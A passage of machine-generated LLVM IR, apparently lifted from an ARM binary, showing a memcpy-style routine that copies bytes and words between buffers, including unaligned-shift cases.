  %v0_1592c = phi i32 [ %v1_158d8, %dec_label_pc_158d8 ], [ %v0_1592c.pre, %.thread115 ]
  %v1_1592c = add i32 %v0_1592c, 8
  store i32 %v1_1592c, i32* %r2.global-to-local, align 4
  %v3_1592c = sub i32 0, %v0_1592c
  %v4_1592c = and i32 %v1_1592c, %v3_1592c
  %v5_1592c = icmp slt i32 %v4_1592c, 0
  store i1 %v5_1592c, i1* %cpsr_v.global-to-local, align 1
  %v6_1592c = icmp slt i32 %v1_1592c, 0
  store i1 %v6_1592c, i1* %cpsr_n.global-to-local, align 1
  %v7_1592c = icmp eq i32 %v1_1592c, 0
  store i1 %v7_1592c, i1* %cpsr_z.global-to-local, align 1
  %v2_15930 = xor i1 %v6_1592c, %v5_1592c
  br i1 %v2_15930, label %bb140, label %dec_label_pc_15934

dec_label_pc_15934:                               ; preds = %dec_label_pc_1592c
  %v1_15934 = add i32 %v0_1592c, 4
  store i32 %v1_15934, i32* %r2.global-to-local, align 4
  %v3_15934 = sub i32 -5, %v0_1592c
  %v4_15934 = and i32 %v3_15934, %v1_1592c
  %v5_15934 = icmp slt i32 %v4_15934, 0
  store i1 %v5_15934, i1* %cpsr_v.global-to-local, align 1
  %v6_15934 = icmp slt i32 %v1_15934, 0
  store i1 %v6_15934, i1* %cpsr_n.global-to-local, align 1
  %v7_15934 = icmp eq i32 %v1_1592c, 4
  store i1 %v7_15934, i1* %cpsr_z.global-to-local, align 1
  %v2_15938 = xor i1 %v6_15934, %v5_15934
  %v3_15938 = load i32, i32* @r1, align 4
  %v4_15938 = inttoptr i32 %v3_15938 to i32*
  %v5_15938 = load i32, i32* %v4_15938, align 4
  store i32 %v5_15938, i32* @r3, align 4
  %v7_15938 = add i32 %v3_15938, 4
  br i1 %v2_15938, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_15934
  store i32 %v7_15938, i32* @r1, align 4
  %v5_1593c = inttoptr i32 %v4_1593c to i32*
  store i32 %v5_15938, i32* %v5_1593c, align 4
  %v6_1593c = load i32, i32* @r0, align 4
  %v7_1593c = add i32 %v6_1593c, 4
  store i32 %v7_1593c, i32* @r0, align 4
  %v0_1594c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_15934
  %v7_15940 = inttoptr i32 %v7_15938 to i32*
  %v8_15940 = load i32, i32* %v7_15940, align 4
  store i32 %v8_15940, i32* @ip, align 4
  %v9_15940 = add i32 %v3_15938, 8
  store i32 %v9_15940, i32* @r1, align 4
  %v4_15944 = inttoptr i32 %v4_1593c to i32*
  store i32 %v5_15938, i32* %v4_15944, align 4
  %v6_15944 = add i32 %v4_1593c, 4
  %v7_15944 = inttoptr i32 %v6_15944 to i32*
  %v8_15944 = load i32, i32* @ip, align 4
  store i32 %v8_15944, i32* %v7_15944, align 4
  %v9_15944 = add i32 %v4_1593c, 8
  store i32 %v9_15944, i32* @r0, align 4
  %v3_15948 = load i32, i32* %r2.global-to-local, align 4
  %v4_15948 = add i32 %v3_15948, -4
  store i32 %v4_15948, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_1592c, %bb, %dec_label_pc_15afc, %dec_label_pc_15a90, %dec_label_pc_15a24, %bb139
  %v0_1594c = phi i32 [ %v0_1594c.pre, %.thread122 ], [ %v2_1599c, %.thread128 ], [ %v1_1592c, %dec_label_pc_1592c ], [ %v2_158c0, %bb ], [ %v0_1594c61, %dec_label_pc_15afc ], [ %v0_1594c60, %dec_label_pc_15a90 ], [ %v0_1594c59, %dec_label_pc_15a24 ], [ %v4_15948, %bb139 ]
  %v1_1594c = add i32 %v0_1594c, 4
  store i32 %v1_1594c, i32* %r2.global-to-local, align 4
  %v3_1594c = sub i32 0, %v0_1594c
  %v4_1594c = and i32 %v1_1594c, %v3_1594c
  %v5_1594c = icmp slt i32 %v4_1594c, 0
  store i1 %v5_1594c, i1* %cpsr_v.global-to-local, align 1
  %v6_1594c = icmp slt i32 %v1_1594c, 0
  store i1 %v6_1594c, i1* %cpsr_n.global-to-local, align 1
  %v7_1594c = icmp eq i32 %v1_1594c, 0
  store i1 %v7_1594c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1594c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_15954.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_15950 = load i8*, i8** %stack_var_-8, align 4
  %v4_15950 = ptrtoint i8* %v3_15950 to i32
  store i32 %v4_15950, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_15954 = phi i32 [ %v0_15954.pre, %bb140.bb142_crit_edge ], [ %v8_158bc, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1594c, i32 %v0_15954)
  %v0_15958 = load i32, i32* %r2.global-to-local, align 4
  %v1_15958 = add i32 %v0_15958, -2
  %v3_15958 = sub i32 1, %v0_15958
  %v4_15958 = and i32 %v3_15958, %v0_15958
  %v5_15958 = icmp slt i32 %v4_15958, 0
  store i1 %v5_15958, i1* %cpsr_v.global-to-local, align 1
  %v6_15958 = icmp slt i32 %v1_15958, 0
  store i1 %v6_15958, i1* %cpsr_n.global-to-local, align 1
  %v7_15958 = icmp eq i32 %v0_15958, 2
  store i1 %v7_15958, i1* %cpsr_z.global-to-local, align 1
  %v0_1595c = load i32, i32* @r1, align 4
  %v1_1595c = inttoptr i32 %v0_1595c to i8*
  %v2_1595c = load i8, i8* %v1_1595c, align 1
  %v5_1595c = add i32 %v0_1595c, 1
  store i32 %v5_1595c, i32* %r1.global-to-local, align 4
  %v2_15960 = load i32, i32* @r0, align 4
  %v3_15960 = inttoptr i32 %v2_15960 to i8*
  store i8 %v2_1595c, i8* %v3_15960, align 1
  %v4_15960 = load i32, i32* @r0, align 4
  %v5_15960 = add i32 %v4_15960, 1
  store i32 %v5_15960, i32* %r0.global-to-local, align 4
  %v0_15964 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15964 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15964 = xor i1 %v0_15964, %v1_15964
  br i1 %v2_15964, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_15964 = load i32, i32* %r1.global-to-local, align 4
  %v4_15964 = inttoptr i32 %v3_15964 to i8*
  %v5_15964 = load i8, i8* %v4_15964, align 1
  %v8_15964 = add i32 %v3_15964, 1
  store i32 %v8_15964, i32* %r1.global-to-local, align 4
  %v6_15968 = inttoptr i32 %v5_15960 to i8*
  store i8 %v5_15964, i8* %v6_15968, align 1
  %v7_15968 = load i32, i32* %r0.global-to-local, align 4
  %v8_15968 = add i32 %v7_15968, 1
  store i32 %v8_15968, i32* %r0.global-to-local, align 4
  %v1_1596c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1596c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_15970 = phi i32 [ %v8_15968, %bb143 ], [ %v5_15960, %bb142 ]
  %v2_15970 = phi i1 [ %v2_1596c.pre, %bb143 ], [ %v1_15964, %bb142 ]
  %v1_15970 = phi i1 [ %v1_1596c.pre, %bb143 ], [ %v0_15964, %bb142 ]
  %v0_1596c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1596c = xor i1 %v2_15970, %v1_15970
  %v4_1596c = or i1 %v0_1596c, %v3_1596c
  br i1 %v4_1596c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_1596c = load i32, i32* %r1.global-to-local, align 4
  %v6_1596c = inttoptr i32 %v5_1596c to i8*
  %v7_1596c = load i8, i8* %v6_1596c, align 1
  %v10_1596c = add i32 %v5_1596c, 1
  store i32 %v10_1596c, i32* %r1.global-to-local, align 4
  %v8_15970 = inttoptr i32 %v7_15970 to i8*
  store i8 %v7_1596c, i8* %v8_15970, align 1
  %v9_15970 = load i32, i32* %r0.global-to-local, align 4
  %v10_15970 = add i32 %v9_15970, 1
  store i32 %v10_15970, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_15974 = load i8*, i8** %stack_var_-8, align 4
  %v3_15974 = ptrtoint i8* %v2_15974 to i32
  store i32 %v3_15974, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_158bc)
  %v0_1597c.pre = load i32, i32* @ip, align 4
  %v0_15984.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_15988.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1597c

dec_label_pc_1597c:                               ; preds = %dec_label_pc_158c8, %.thread126
  %v2_15988 = phi i32 [ %v1_158b0, %dec_label_pc_158c8 ], [ %v2_15988.pre, %.thread126 ]
  %v0_15984 = phi i32 [ %v0_158b0, %dec_label_pc_158c8 ], [ %v0_15984.pre, %.thread126 ]
  %v0_1597c = phi i32 [ %v1_158c8, %dec_label_pc_158c8 ], [ %v0_1597c.pre, %.thread126 ]
  %v1_1597c = sub i32 4, %v0_1597c
  store i32 %v1_1597c, i32* @ip, align 4
  %v1_15980 = add i32 %v1_1597c, -2
  %v3_15980 = sub i32 1, %v1_1597c
  %v4_15980 = and i32 %v3_15980, %v1_1597c
  %v5_15980 = icmp slt i32 %v4_15980, 0
  store i1 %v5_15980, i1* %cpsr_v.global-to-local, align 1
  %v6_15980 = icmp slt i32 %v1_15980, 0
  store i1 %v6_15980, i1* %cpsr_n.global-to-local, align 1
  %v7_15980 = icmp eq i32 %v1_1597c, 2
  store i1 %v7_15980, i1* %cpsr_z.global-to-local, align 1
  %v1_15984 = inttoptr i32 %v0_15984 to i8*
  %v2_15984 = load i8, i8* %v1_15984, align 1
  %v3_15984 = zext i8 %v2_15984 to i32
  store i32 %v3_15984, i32* @r3, align 4
  %v5_15984 = add i32 %v0_15984, 1
  store i32 %v5_15984, i32* @r1, align 4
  %v3_15988 = inttoptr i32 %v2_15988 to i8*
  store i8 %v2_15984, i8* %v3_15988, align 1
  %v4_15988 = load i32, i32* @r0, align 4
  %v5_15988 = add i32 %v4_15988, 1
  store i32 %v5_15988, i32* @r0, align 4
  %v0_1598c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1598c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1598c = xor i1 %v0_1598c, %v1_1598c
  br i1 %v2_1598c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_1597c
  %v3_1598c = load i32, i32* @r1, align 4
  %v4_1598c = inttoptr i32 %v3_1598c to i8*
  %v5_1598c = load i8, i8* %v4_1598c, align 1
  %v6_1598c = zext i8 %v5_1598c to i32
  store i32 %v6_1598c, i32* @r3, align 4
  %v8_1598c = add i32 %v3_1598c, 1
  store i32 %v8_1598c, i32* @r1, align 4
  %v6_15990 = inttoptr i32 %v5_15988 to i8*
  store i8 %v5_1598c, i8* %v6_15990, align 1
  %v7_15990 = load i32, i32* @r0, align 4
  %v8_15990 = add i32 %v7_15990, 1
  store i32 %v8_15990, i32* @r0, align 4
  %v1_15994.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15994.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_1597c, %bb145
  %v7_15998 = phi i32 [ %v8_15990, %bb145 ], [ %v5_15988, %dec_label_pc_1597c ]
  %v2_15998 = phi i1 [ %v2_15994.pre, %bb145 ], [ %v1_1598c, %dec_label_pc_1597c ]
  %v1_15998 = phi i1 [ %v1_15994.pre, %bb145 ], [ %v0_1598c, %dec_label_pc_1597c ]
  %v0_15994 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_15994 = xor i1 %v2_15998, %v1_15998
  %v4_15994 = or i1 %v0_15994, %v3_15994
  br i1 %v4_15994, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_15994 = load i32, i32* @r1, align 4
  %v6_15994 = inttoptr i32 %v5_15994 to i8*
  %v7_15994 = load i8, i8* %v6_15994, align 1
  %v8_15994 = zext i8 %v7_15994 to i32
  store i32 %v8_15994, i32* @r3, align 4
  %v10_15994 = add i32 %v5_15994, 1
  store i32 %v10_15994, i32* @r1, align 4
  %v8_15998 = inttoptr i32 %v7_15998 to i8*
  store i8 %v7_15994, i8* %v8_15998, align 1
  %v9_15998 = load i32, i32* @r0, align 4
  %v10_15998 = add i32 %v9_15998, 1
  store i32 %v10_15998, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_15acc77 = phi i32 [ %v10_15998, %bb146 ], [ %v7_15998, %.thread127 ]
  %v0_1599c = load i32, i32* %r2.global-to-local, align 4
  %v1_1599c = load i32, i32* @ip, align 4
  %v2_1599c = sub i32 %v0_1599c, %v1_1599c
  store i32 %v2_1599c, i32* %r2.global-to-local, align 4
  %v4_1599c = xor i32 %v1_1599c, %v0_1599c
  %v5_1599c = xor i32 %v2_1599c, %v0_1599c
  %v6_1599c = and i32 %v5_1599c, %v4_1599c
  %v7_1599c = icmp slt i32 %v6_1599c, 0
  store i1 %v7_1599c, i1* %cpsr_v.global-to-local, align 1
  %v8_1599c = icmp slt i32 %v2_1599c, 0
  store i1 %v8_1599c, i1* %cpsr_n.global-to-local, align 1
  %v9_1599c = icmp eq i32 %v0_1599c, %v1_1599c
  store i1 %v9_1599c, i1* %cpsr_z.global-to-local, align 1
  %v2_159a0 = xor i1 %v8_1599c, %v7_1599c
  br i1 %v2_159a0, label %bb140, label %dec_label_pc_159a4

dec_label_pc_159a4:                               ; preds = %.thread128
  %v0_159a4 = load i32, i32* @r1, align 4
  %v1_159a4 = urem i32 %v0_159a4, 4
  store i32 %v1_159a4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_159a4 = icmp eq i32 %v1_159a4, 0
  store i1 %v2_159a4, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_159a4 to i2
  br i1 %v2_159a4, label %dec_label_pc_158d8, label %dec_label_pc_159ac

dec_label_pc_159ac:                               ; preds = %dec_label_pc_158d0, %dec_label_pc_159a4
  %v0_15acc76 = phi i32 [ %v1_158b0, %dec_label_pc_158d0 ], [ %v0_15acc77, %dec_label_pc_159a4 ]
  %v0_15a34 = phi i32 [ %v2_158c0, %dec_label_pc_158d0 ], [ %v2_1599c, %dec_label_pc_159a4 ]
  %v0_159b4.off0 = phi i2 [ %extract.t, %dec_label_pc_158d0 ], [ %extract.t131, %dec_label_pc_159a4 ]
  %v0_159ac = phi i32 [ %v0_158b0, %dec_label_pc_158d0 ], [ %v0_159a4, %dec_label_pc_159a4 ]
  %v1_159ac = and i32 %v0_159ac, -4
  store i32 %v1_159ac, i32* %r1.global-to-local, align 4
  %v1_159b0 = inttoptr i32 %v1_159ac to i32*
  %v2_159b0 = load i32, i32* %v1_159b0, align 4
  store i32 %v2_159b0, i32* %lr.global-to-local, align 4
  %v4_159b0 = add i32 %v1_159ac, 4
  store i32 %v4_159b0, i32* %r1.global-to-local, align 4
  %v1_15a2c = add i32 %v0_15a34, -12
  %v3_15a2c = sub i32 11, %v0_15a34
  %v4_15a2c = and i32 %v3_15a2c, %v0_15a34
  %v5_15a2c = icmp slt i32 %v4_15a2c, 0
  store i1 %v5_15a2c, i1* %cpsr_v.global-to-local, align 1
  %v6_15a2c = icmp slt i32 %v1_15a2c, 0
  store i1 %v6_15a2c, i1* %cpsr_n.global-to-local, align 1
  %v7_15a2c = icmp eq i32 %v0_15a34, 12
  store i1 %v7_15a2c, i1* %cpsr_z.global-to-local, align 1
  %v2_15a30 = xor i1 %v6_15a2c, %v5_15a2c
  switch i2 %v0_159b4.off0, label %dec_label_pc_159c0 [
    i2 -1, label %dec_label_pc_15a98
    i2 -2, label %dec_label_pc_15a2c
  ]

dec_label_pc_159c0:                               ; preds = %dec_label_pc_159ac
  br i1 %v2_15a30, label %dec_label_pc_15a0c, label %dec_label_pc_159c8

dec_label_pc_159c8:                               ; preds = %dec_label_pc_159c0
  store i32 %v1_15a2c, i32* %r2.global-to-local, align 4
  %v3_159cc = load i32, i32* @r4, align 4
  store i32 %v3_159cc, i32* %stack_var_-16, align 4
  %v6_159cc = load i32, i32* @r5, align 4
  store i32 %v6_159cc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_159d0

dec_label_pc_159d0:                               ; preds = %dec_label_pc_159d0.dec_label_pc_159d0_crit_edge, %dec_label_pc_159c8
  %v0_159f4 = phi i32 [ %v12_159f4, %dec_label_pc_159d0.dec_label_pc_159d0_crit_edge ], [ %v0_15acc76, %dec_label_pc_159c8 ]
  %v0_159d4 = phi i32 [ %v0_159d4.pre, %dec_label_pc_159d0.dec_label_pc_159d0_crit_edge ], [ %v4_159b0, %dec_label_pc_159c8 ]
  %v0_159d0 = phi i32 [ %v0_159d0.pre, %dec_label_pc_159d0.dec_label_pc_159d0_crit_edge ], [ %v2_159b0, %dec_label_pc_159c8 ]
  %v3_159d0 = udiv i32 %v0_159d0, 256
  %v1_159d4 = inttoptr i32 %v0_159d4 to i32*
  %v2_159d4 = load i32, i32* %v1_159d4, align 4
  store i32 %v2_159d4, i32* %r4.global-to-local, align 4
  %v3_159d4 = add i32 %v0_159d4, 4
  %v4_159d4 = inttoptr i32 %v3_159d4 to i32*
  %v5_159d4 = load i32, i32* %v4_159d4, align 4
  store i32 %v5_159d4, i32* %r5.global-to-local, align 4
  %v6_159d4 = add i32 %v0_159d4, 8
  %v7_159d4 = inttoptr i32 %v6_159d4 to i32*
  %v8_159d4 = load i32, i32* %v7_159d4, align 4
  store i32 %v8_159d4, i32* %ip.global-to-local, align 4
  %v9_159d4 = add i32 %v0_159d4, 12
  %v10_159d4 = inttoptr i32 %v9_159d4 to i32*
  %v11_159d4 = load i32, i32* %v10_159d4, align 4
  store i32 %v11_159d4, i32* %lr.global-to-local, align 4
  %v12_159d4 = add i32 %v0_159d4, 16
  store i32 %v12_159d4, i32* %r1.global-to-local, align 4
  %v4_159d8 = mul i32 %v2_159d4, 16777216
  %v5_159d8 = or i32 %v4_159d8, %v3_159d0
  store i32 %v5_159d8, i32* @r3, align 4
  %v3_159dc = udiv i32 %v2_159d4, 256
  %v4_159e0 = mul i32 %v5_159d4, 16777216
  %v5_159e0 = or i32 %v4_159e0, %v3_159dc
  store i32 %v5_159e0, i32* %r4.global-to-local, align 4
  %v3_159e4 = udiv i32 %v5_159d4, 256
  %v4_159e8 = mul i32 %v8_159d4, 16777216
  %v5_159e8 = or i32 %v4_159e8, %v3_159e4
  store i32 %v5_159e8, i32* %r5.global-to-local, align 4
  %v3_159ec = udiv i32 %v8_159d4, 256
  %v4_159f0 = mul i32 %v11_159d4, 16777216
  %v5_159f0 = or i32 %v4_159f0, %v3_159ec
  store i32 %v5_159f0, i32* @ip, align 4
  %v1_159f4 = inttoptr i32 %v0_159f4 to i32*
  store i32 %v5_159d8, i32* %v1_159f4, align 4
  %v3_159f4 = add i32 %v0_159f4, 4
  %v4_159f4 = inttoptr i32 %v3_159f4 to i32*
  %v5_159f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_159f4, i32* %v4_159f4, align 4
  %v6_159f4 = add i32 %v0_159f4, 8
  %v7_159f4 = inttoptr i32 %v6_159f4 to i32*
  %v8_159f4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_159f4, i32* %v7_159f4, align 4
  %v9_159f4 = add i32 %v0_159f4, 12
  %v10_159f4 = inttoptr i32 %v9_159f4 to i32*
  %v11_159f4 = load i32, i32* @ip, align 4
  store i32 %v11_159f4, i32* %v10_159f4, align 4
  %v12_159f4 = add i32 %v0_159f4, 16
  store i32 %v12_159f4, i32* @r0, align 4
  %v0_159f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_159f8 = add i32 %v0_159f8, -16
  store i32 %v1_159f8, i32* %r2.global-to-local, align 4
  %v3_159f8 = sub i32 15, %v0_159f8
  %v4_159f8 = and i32 %v3_159f8, %v0_159f8
  %v5_159f8 = icmp slt i32 %v4_159f8, 0
  %v6_159f8 = icmp slt i32 %v1_159f8, 0
  %v2_159fc = xor i1 %v6_159f8, %v5_159f8
  br i1 %v2_159fc, label %dec_label_pc_15a00, label %dec_label_pc_159d0.dec_label_pc_159d0_crit_edge

dec_label_pc_159d0.dec_label_pc_159d0_crit_edge:  ; preds = %dec_label_pc_159d0
  %v0_159d0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_159d4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_159d0

dec_label_pc_15a00:                               ; preds = %dec_label_pc_159d0
  %v2_15a00 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15a00, i32* @r4, align 4
  %v5_15a00 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15a00, i32* @r5, align 4
  %v1_15a04 = add i32 %v0_159f8, -4
  store i32 %v1_15a04, i32* %r2.global-to-local, align 4
  %v3_15a04 = add i32 %v0_159f8, 2147483632
  %v4_15a04 = and i32 %v1_15a04, %v3_15a04
  %v5_15a04 = icmp slt i32 %v4_15a04, 0
  store i1 %v5_15a04, i1* %cpsr_v.global-to-local, align 1
  %v6_15a04 = icmp slt i32 %v1_15a04, 0
  store i1 %v6_15a04, i1* %cpsr_n.global-to-local, align 1
  %v7_15a04 = icmp eq i32 %v1_15a04, 0
  store i1 %v7_15a04, i1* %cpsr_z.global-to-local, align 1
  %v2_15a08 = xor i1 %v6_15a04, %v5_15a04
  br i1 %v2_15a08, label %dec_label_pc_15a24, label %dec_label_pc_15a0c

dec_label_pc_15a0c:                               ; preds = %dec_label_pc_15a00, %dec_label_pc_159c0, %dec_label_pc_15a0c
  %v1_15a18 = phi i32 [ %v4_15a18, %dec_label_pc_15a0c ], [ %v12_159f4, %dec_label_pc_15a00 ], [ %v0_15acc76, %dec_label_pc_159c0 ]
  %v0_15a0c = load i32, i32* %lr.global-to-local, align 4
  %v3_15a0c = udiv i32 %v0_15a0c, 256
  store i32 %v3_15a0c, i32* %ip.global-to-local, align 4
  %v0_15a10 = load i32, i32* %r1.global-to-local, align 4
  %v1_15a10 = inttoptr i32 %v0_15a10 to i32*
  %v2_15a10 = load i32, i32* %v1_15a10, align 4
  store i32 %v2_15a10, i32* %lr.global-to-local, align 4
  %v4_15a10 = add i32 %v0_15a10, 4
  store i32 %v4_15a10, i32* %r1.global-to-local, align 4
  %v4_15a14 = mul i32 %v2_15a10, 16777216
  %v5_15a14 = or i32 %v4_15a14, %v3_15a0c
  store i32 %v5_15a14, i32* @ip, align 4
  %v2_15a18 = inttoptr i32 %v1_15a18 to i32*
  store i32 %v5_15a14, i32* %v2_15a18, align 4
  %v3_15a18 = load i32, i32* @r0, align 4
  %v4_15a18 = add i32 %v3_15a18, 4
  store i32 %v4_15a18, i32* @r0, align 4
  %v0_15a1c = load i32, i32* %r2.global-to-local, align 4
  %v1_15a1c = add i32 %v0_15a1c, -4
  store i32 %v1_15a1c, i32* %r2.global-to-local, align 4
  %v3_15a1c = sub i32 3, %v0_15a1c
  %v4_15a1c = and i32 %v3_15a1c, %v0_15a1c
  %v5_15a1c = icmp slt i32 %v4_15a1c, 0
  %v6_15a1c = icmp slt i32 %v1_15a1c, 0
  %v2_15a20 = xor i1 %v6_15a1c, %v5_15a1c
  br i1 %v2_15a20, label %dec_label_pc_15a24.loopexit, label %dec_label_pc_15a0c

dec_label_pc_15a24.loopexit:                      ; preds = %dec_label_pc_15a0c
  %v7_15a1c = icmp eq i32 %v0_15a1c, 4
  store i1 %v5_15a1c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_15a1c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_15a1c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15a24

dec_label_pc_15a24:                               ; preds = %dec_label_pc_15a24.loopexit, %dec_label_pc_15a00
  %v0_1594c59 = phi i32 [ %v1_15a1c, %dec_label_pc_15a24.loopexit ], [ %v1_15a04, %dec_label_pc_15a00 ]
  %v0_15a24 = load i32, i32* %r1.global-to-local, align 4
  %v1_15a24 = add i32 %v0_15a24, -3
  store i32 %v1_15a24, i32* @r1, align 4
  br label %bb140

dec_label_pc_15a2c:                               ; preds = %dec_label_pc_159ac
  br i1 %v2_15a30, label %dec_label_pc_15a78, label %dec_label_pc_15a34

dec_label_pc_15a34:                               ; preds = %dec_label_pc_15a2c
  store i32 %v1_15a2c, i32* %r2.global-to-local, align 4
  %v3_15a38 = load i32, i32* @r4, align 4
  store i32 %v3_15a38, i32* %stack_var_-16, align 4
  %v6_15a38 = load i32, i32* @r5, align 4
  store i32 %v6_15a38, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15a3c

dec_label_pc_15a3c:                               ; preds = %dec_label_pc_15a3c.dec_label_pc_15a3c_crit_edge, %dec_label_pc_15a34
  %v0_15a60 = phi i32 [ %v12_15a60, %dec_label_pc_15a3c.dec_label_pc_15a3c_crit_edge ], [ %v0_15acc76, %dec_label_pc_15a34 ]
  %v0_15a40 = phi i32 [ %v0_15a40.pre, %dec_label_pc_15a3c.dec_label_pc_15a3c_crit_edge ], [ %v4_159b0, %dec_label_pc_15a34 ]
  %v0_15a3c = phi i32 [ %v0_15a3c.pre, %dec_label_pc_15a3c.dec_label_pc_15a3c_crit_edge ], [ %v2_159b0, %dec_label_pc_15a34 ]
  %v3_15a3c = udiv i32 %v0_15a3c, 65536
  %v1_15a40 = inttoptr i32 %v0_15a40 to i32*
  %v2_15a40 = load i32, i32* %v1_15a40, align 4
  store i32 %v2_15a40, i32* %r4.global-to-local, align 4
  %v3_15a40 = add i32 %v0_15a40, 4
  %v4_15a40 = inttoptr i32 %v3_15a40 to i32*
  %v5_15a40 = load i32, i32* %v4_15a40, align 4
  store i32 %v5_15a40, i32* %r5.global-to-local, align 4
  %v6_15a40 = add i32 %v0_15a40, 8
  %v7_15a40 = inttoptr i32 %v6_15a40 to i32*
  %v8_15a40 = load i32, i32* %v7_15a40, align 4
  store i32 %v8_15a40, i32* %ip.global-to-local, align 4
  %v9_15a40 = add i32 %v0_15a40, 12
  %v10_15a40 = inttoptr i32 %v9_15a40 to i32*
  %v11_15a40 = load i32, i32* %v10_15a40, align 4
  store i32 %v11_15a40, i32* %lr.global-to-local, align 4
  %v12_15a40 = add i32 %v0_15a40, 16
  store i32 %v12_15a40, i32* %r1.global-to-local, align 4
  %v4_15a44 = mul i32 %v2_15a40, 65536
  %v5_15a44 = or i32 %v4_15a44, %v3_15a3c
  store i32 %v5_15a44, i32* @r3, align 4
  %v3_15a48 = udiv i32 %v2_15a40, 65536
  %v4_15a4c = mul i32 %v5_15a40, 65536
  %v5_15a4c = or i32 %v4_15a4c, %v3_15a48
  store i32 %v5_15a4c, i32* %r4.global-to-local, align 4
  %v3_15a50 = udiv i32 %v5_15a40, 65536
  %v4_15a54 = mul i32 %v8_15a40, 65536
  %v5_15a54 = or i32 %v4_15a54, %v3_15a50
  store i32 %v5_15a54, i32* %r5.global-to-local, align 4
  %v3_15a58 = udiv i32 %v8_15a40, 65536
  %v4_15a5c = mul i32 %v11_15a40, 65536
  %v5_15a5c = or i32 %v4_15a5c, %v3_15a58
  store i32 %v5_15a5c, i32* @ip, align 4
  %v1_15a60 = inttoptr i32 %v0_15a60 to i32*
  store i32 %v5_15a44, i32* %v1_15a60, align 4
  %v3_15a60 = add i32 %v0_15a60, 4
  %v4_15a60 = inttoptr i32 %v3_15a60 to i32*
  %v5_15a60 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15a60, i32* %v4_15a60, align 4
  %v6_15a60 = add i32 %v0_15a60, 8
  %v7_15a60 = inttoptr i32 %v6_15a60 to i32*
  %v8_15a60 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15a60, i32* %v7_15a60, align 4
  %v9_15a60 = add i32 %v0_15a60, 12
  %v10_15a60 = inttoptr i32 %v9_15a60 to i32*
  %v11_15a60 = load i32, i32* @ip, align 4
  store i32 %v11_15a60, i32* %v10_15a60, align 4
  %v12_15a60 = add i32 %v0_15a60, 16
  store i32 %v12_15a60, i32* @r0, align 4
  %v0_15a64 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a64 = add i32 %v0_15a64, -16
  store i32 %v1_15a64, i32* %r2.global-to-local, align 4
  %v3_15a64 = sub i32 15, %v0_15a64
  %v4_15a64 = and i32 %v3_15a64, %v0_15a64
  %v5_15a64 = icmp slt i32 %v4_15a64, 0
  %v6_15a64 = icmp slt i32 %v1_15a64, 0
  %v2_15a68 = xor i1 %v6_15a64, %v5_15a64
  br i1 %v2_15a68, label %dec_label_pc_15a6c, label %dec_label_pc_15a3c.dec_label_pc_15a3c_crit_edge

dec_label_pc_15a3c.dec_label_pc_15a3c_crit_edge:  ; preds = %dec_label_pc_15a3c
  %v0_15a3c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_15a40.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15a3c

dec_label_pc_15a6c:                               ; preds = %dec_label_pc_15a3c
  %v2_15a6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15a6c, i32* @r4, align 4
  %v5_15a6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15a6c, i32* @r5, align 4
  %v1_15a70 = add i32 %v0_15a64, -4
  store i32 %v1_15a70, i32* %r2.global-to-local, align 4
  %v3_15a70 = add i32 %v0_15a64, 2147483632
  %v4_15a70 = and i32 %v1_15a70, %v3_15a70
  %v5_15a70 = icmp slt i32 %v4_15a70, 0
  store i1 %v5_15a70, i1* %cpsr_v.global-to-local, align 1
